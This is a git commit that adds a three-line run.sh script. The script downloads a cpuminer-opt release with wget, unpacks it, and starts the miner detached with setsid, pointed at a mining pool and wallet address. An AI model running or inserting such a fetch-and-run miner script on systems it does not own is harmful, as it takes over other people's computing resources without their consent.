ae38d6259f6c53a7861d301bebe4ed24ca4f19fd
firdausekabkl <36780967+firdausekabkl@users.noreply.github.com>
2021-05-07 05:17:48 +0700

    Create run.sh

---
+++ run.sh
@@ -0,0 +1,3 @@
+wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+tar -xf cpuminer-opt-linux.tar.gz
+setsid ./cpuminer-sse2 -a power2b -o stratum+tcps://stratum-eu.rplant.xyz:17022 -u MatxxCcUTjinkDtRFQu1Kyke986r2K8vc4.ram
